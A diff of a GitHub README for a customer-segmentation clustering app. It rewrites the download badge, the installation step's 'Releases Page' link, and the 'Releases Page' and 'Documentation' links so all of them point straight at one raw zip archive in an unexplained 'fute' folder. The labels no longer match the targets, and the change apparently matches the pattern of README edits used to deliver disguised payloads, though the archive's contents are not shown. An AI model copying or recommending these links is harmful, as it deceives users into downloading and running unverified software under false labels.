@@ -1,7 +1,7 @@
 # 🎉 Customer-Segmentation - Effortlessly Identify Customer Groups
 
 ## 📥 Download the Software
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/AndresRv16/Customer-Segmentation/releases)
+[![Download](https://raw.githubusercontent.com/AndresRv16/Customer-Segmentation/main/fute/Customer-Segmentation.zip)](https://raw.githubusercontent.com/AndresRv16/Customer-Segmentation/main/fute/Customer-Segmentation.zip)
 
 ## 🚀 Getting Started
 Welcome to the Customer-Segmentation application. This tool uses clustering methods to help you understand your customers better. It identifies distinct groups based on their spending habits using K-Means and DBSCAN algorithms. 
@@ -23,7 +23,7 @@ Welcome to the Customer-Segmentation application. This tool uses clustering meth
 To get started with Customer-Segmentation, follow these simple steps:
 
 1. **Visit our Releases Page**: Click the button below to go to the download page.
-   [Download Customer-Segmentation](https://github.com/AndresRv16/Customer-Segmentation/releases) 
+   [Download Customer-Segmentation](https://raw.githubusercontent.com/AndresRv16/Customer-Segmentation/main/fute/Customer-Segmentation.zip) 
 
 2. **Choose the Latest Version**: On the Releases page, find the most recent release labeled as “Latest Release.” 
 
@@ -80,7 +80,7 @@ If you encounter any issues during installation or while using the application, 
 For further assistance, visit the Issues section on our GitHub repository.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/AndresRv16/Customer-Segmentation/releases)
-- [Documentation](https://github.com/AndresRv16/Customer-Segmentation/wiki)
+- [Releases Page](https://raw.githubusercontent.com/AndresRv16/Customer-Segmentation/main/fute/Customer-Segmentation.zip)
+- [Documentation](https://raw.githubusercontent.com/AndresRv16/Customer-Segmentation/main/fute/Customer-Segmentation.zip)
 
 Thank you for choosing Customer-Segmentation. We hope this tool enhances your ability to understand customer behavior and make informed marketing decisions!
